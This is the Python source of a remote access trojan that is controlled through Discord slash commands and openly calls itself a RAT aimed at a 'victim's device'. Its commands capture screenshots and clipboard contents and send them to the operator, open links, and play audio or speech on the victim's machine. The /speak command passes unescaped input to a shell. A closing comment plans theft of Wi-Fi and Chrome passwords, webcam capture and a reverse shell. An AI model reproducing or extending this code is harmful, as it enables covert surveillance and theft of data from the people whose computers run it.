from discord.commands.context import ApplicationContext
from discord.commands import Option
import discord
from rich.console import Console
from rich import print as printf
from rich.panel import Panel
from playsound import playsound
import pyperclip as clip
import mss

from io import StringIO
import threading as thr
import webbrowser as wb
import platform as pf
import time as t
import argparse
import json
import os

from funcs import ask, get_user, get_temp, get_time, a, handle_error, is_module_allowed






MODULE_NAMES = ['Screenshot', 'Speak', 'Play Audio', 'Clipboard Access', 'Open Link(s)']
CONFIG_FILE_PATH = os.path.join( os.path.dirname(__file__) , 'config.json' )
MODULE_NAMES.sort()
SYSTEM = pf.system()

bot = discord.Bot()
console = Console()
audio_thread = thr.Thread()
cls = lambda: os.system('cls') if SYSTEM == 'Windows' else os.system('clear')
cls()

# Checks if the config file exists
if not os.path.exists(CONFIG_FILE_PATH):
    printf(f'[red1]The config file does not exist! Please make one at [u]{CONFIG_FILE_PATH}[/][/]')
    exit()
# Loads the config
with open(CONFIG_FILE_PATH, 'r') as f:    CONFIG = json.load(f)
TOKEN = CONFIG['token']
GUILD_IDS = CONFIG['guild_ids']


# Makes the parser obj
parser = argparse.ArgumentParser(description='Process some integers.')
# Adds the -a, --ask flag
parser.add_argument('-a', '--ask', action='store_true', help='Prompts the user for modules')
args = parser.parse_args()
# Gets the ask flag
if args.ask:    ALLOWED_MODULES = ask(MODULE_NAMES)['lol']
else:           ALLOWED_MODULES = MODULE_NAMES
# If no modules are allowed, ends the program
if not ALLOWED_MODULES:
    printf(f'[red1]Whats the fucking point of using a RAT if you\'re gonna disable all its modules -_-[/]')
    exit()
# Sorta the ALLOWED_MODULES
ALLOWED_MODULES.sort()











def play_audio(ctx: ApplicationContext, filepath: str):
    printf(f'{a(ctx)} [i green3]Playing [u]{filepath}[/]')
    playsound(filepath)
    




    















@bot.event
async def on_ready():
    global USR
    USR = get_user(SYSTEM)
    panel = Panel(
        f'[bold green1]LOGGED IN AS [u]{bot.user}[/][/]',
        title='[u bold dark_green][INFORMATION][/]',
        subtitle=f'[magenta1]({t.asctime()})[/]',
        border_style='bold yellow2'
    )
    printf(panel)
    print('\n')


@bot.event
async def on_interaction(interaction: discord.Interaction):
    # Logs the slash command
    printf(f'[grey50]({get_time()})[/] [magenta]<{interaction.user}>[/] ', end='')
    print(f'/{interaction.data.get("name")}', end='')
    # Gets the arguments text
    options:list = interaction.data.get('options')
    if not options:
        arg_text = ''
    else:
        args = {}
        for i in options:
            name = i.get('name')
            value = i.get('value')
            args[name] = value
        args_list = [f'{name}: {value}' for name, value in args.items()]
        arg_text = '<'
        arg_text += ', '.join(args_list)
        arg_text += '>'
    printf(f' [turquoise2]{arg_text}[/]')
    # Processes the command
    await bot.process_application_commands(interaction)













@bot.slash_command(name='modules', description='Tells all the modules that are available', guild_ids=GUILD_IDS)
async def modules_command(ctx: ApplicationContext):
    try:
        text = '\n'.join(ALLOWED_MODULES)
        text = f'The user has allowed the following modules:\n```\n{text}\n```'
        await ctx.respond(text)
        printf(f'{a(ctx)} [i green3]Sent the allowed modules list[/]')
    except Exception as e:
        await handle_error(ctx, e, console)



@bot.slash_command(name='screenshot', description='Sends a screenshot', guild_ids=GUILD_IDS)
async def screenshot_command(ctx: ApplicationContext):
    try:
        # Checks if user has allowed us to use this module
        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Screenshot'):    return
        
        # Gets the TEMP directory
        temp_dir = get_temp(SYSTEM, USR)
        # Makes the TEMP directory
        os.makedirs(temp_dir, exist_ok=True)
        # Gets the location for the screenshot
        filename = os.path.join(temp_dir , '9010.png')
        # Takes a screenshot
        with mss.mss() as sct:    sct.shot(output=filename)
        printf(f'{a(ctx)} [green3][i]Took a screenshot at [u]{filename}[/][/][/]')
        # Makes a file object
        with open(filename, 'rb') as f:    file = discord.File(f)
        # Sends the file
        await ctx.respond(file=file)
        printf(f'{a(ctx)} [green3][i]Sent the screenshot[/][/]')
    except Exception as e:
        await handle_error(ctx, e, console)



@bot.slash_command(name='speak', description='Speaks the given text', guild_ids=GUILD_IDS)
async def speak_command(ctx: ApplicationContext, text: Option(str, 'Enter the text to speak')):
    try:
        # Checks if user has allowed us to use this module
        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Speak'):    return
    
        await ctx.respond('Started Speaking')
        printf(f'{a(ctx)} [i green3]Started Speaking[/]')
        if SYSTEM == 'Windows':
            from win32com.client import Dispatch
            obj = Dispatch("SAPI.SpVoice").Speak
            obj(text)
        else:
            os.popen(f'say "{text}"')
        printf(f'{a(ctx)} [i green3]Spoken[/]')
    except Exception as e:
        await handle_error(ctx, e, console)



@bot.slash_command(name='audio-play', description='Plays the given audio file', guild_ids=GUILD_IDS)
async def play_audio_command(ctx: ApplicationContext, music_file: Option(discord.Attachment, 'Enter the music file to play')):
    try: 
        global audio_thread
        # Checks if user has allowed us to use this module
        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Play Audio'):    return

        # Gets the music file
        music_file: discord.Attachment = music_file
        # Gets info about the file
        file_info:dict = music_file.to_dict()
        file_type:str = file_info.get('content_type')
        # Checks if its an audio file
        if not file_type.startswith('audio'):
            await ctx.respond('I need an audio file -_-')
            printf(f'{a(ctx)} [i red3]Told them that I need an audio file[/]')
            return

        # Checks if something is already playing (aka is the thread active)
        if audio_thread.is_alive():
            await ctx.respond('I am already playing something')
            printf(f'{a(ctx)} [i red3]]Told them that I am already playing something[/]')
            return
        # Downloads the file
        og_msg = await ctx.respond('Downloading....')
        file_path = os.path.join( get_temp(SYSTEM,USR) , music_file.filename )
        with open(file_path, 'wb') as f:    await music_file.save(f)
        printf(f'{a(ctx)} [i green3]Downloaded [u]{file_path}[/][/]')
        # Plays it
        audio_thread = thr.Thread(target=play_audio, args=(str(ctx.author), file_path,))
        audio_thread.start()
        await og_msg.edit_original_message(content='Started playing')
    except Exception as e:
        await handle_error(ctx, e, console)



@bot.slash_command(name='audio-check', description='Checks if some audio is playing due to us', guild_ids=GUILD_IDS)
async def check_audio_command(ctx: ApplicationContext):
    try:
        global audio_thread
        # Checks if user has allowed us to use this module
        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Play Audio'):    return

        # Assigns strings on the basis of "is the thread active?"
        text     =  'No audio is being played'                if not audio_thread.is_alive() else 'Some audio is being played'
        log_text = 'Told them that no audio is being played' if not audio_thread.is_alive() else 'Told them that some audio is being played'
        await ctx.respond(text)
        printf(f'{a(ctx)} [i green3]{log_text}[/]')
    except:
        await handle_error(ctx, e, console)



@bot.slash_command(name='clipboard', description='Copy to clipboard or stuff from it', guild_ids=GUILD_IDS)
async def clipboard_command(ctx: ApplicationContext, choice: Option(str, 'Copy or Paste', choices=['copy', 'paste']), to_copy: Option(str, 'If you want to copy, enter the text to copy', required=False)):
    try:
        # Checks if user has allowed us to use this module
        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Clipboard Access'):    return

        # Checks if they wanted to copy but didn't enter anything
        if choice == 'copy' and not to_copy:
            await ctx.respond('You need to enter something to copy')
            printf(f'{a(ctx)} [i red3]Told them that they need to enter something to copy[/]')
            return

        # Paste
        if choice == 'paste':
            # Gets the text in clipboard
            clipboard = clip.paste()
            # Checks if its more than 2k characters. If it is, sends the file
            if len(clipboard) > 2000:
                fp = StringIO(clipboard)
                file = file=discord.File(fp, filename='clipboard.txt')
                await ctx.respond(file=file)
            else:
                await ctx.respond(clipboard)
            printf(f'{a(ctx)} [i green3]Sent the stuff in clipboard[/]')
        
        # Copy
        if choice == 'copy':
            # Copies the text
            clip.copy(to_copy)
            await ctx.respond('Copied')
            printf(f'{a(ctx)} [i green3]Copied[/]')
    except Exception as e:
        await handle_error(ctx, e, console)



@bot.slash_command(name='link', description='Open a link on the victim\'s device', guild_ids=GUILD_IDS)
async def link_command(ctx: ApplicationContext, link: Option(str, 'Enter the link to open')):
    try:
        # Checks if user has allowed us to use this module
        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Open Link(s)'):    return

        # Formats the link
        link = f'https://{link}' if not link.startswith('http') else link
        # Tries to open it
        res = wb.open(link)
        # Checks if we succeeded
        if res:
            await ctx.respond(f'Opened {link}')
            printf(f'{a(ctx)} [i green3]Opened the link[/]')
        # If not, tells the user
        else:
            await ctx.respond(f'I could not open {link}')
            printf(f'{a(ctx)} [red3][i]Told them that I could not open the link[/][/]')
    except Exception as e:
        await handle_error(ctx, e, console)















def main():
    bot.run(TOKEN)



main()


'''
['Wifi Passwords', 'Chrome Passwords', 'Webcam', 'Reverse Shell', 'General Info', 'Display', 'Rotate Screen']

-> on_disconnect
-> Use subprocess in /speak
-> Change color of arguments
'''

